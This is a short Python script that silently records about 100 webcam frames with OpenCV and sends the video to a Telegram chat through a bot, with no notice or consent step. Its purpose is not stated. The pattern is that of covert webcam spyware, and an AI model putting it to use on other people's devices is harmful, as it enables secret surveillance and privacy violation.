import telebot
import cv2
from token_1 import *

bot = telebot.TeleBot(token)

def tel():
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return
    
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter('output.avi', fourcc, 20.0, (640, 480))
    
    for _ in range(100):  
        ret, frame = cap.read()
        if not ret:
            break
        out.write(frame)
    cap.release()
    out.release()
    
    with open('output.avi', 'rb') as video_file:
        bot.send_video(chat_id=id, video=video_file)

tel()
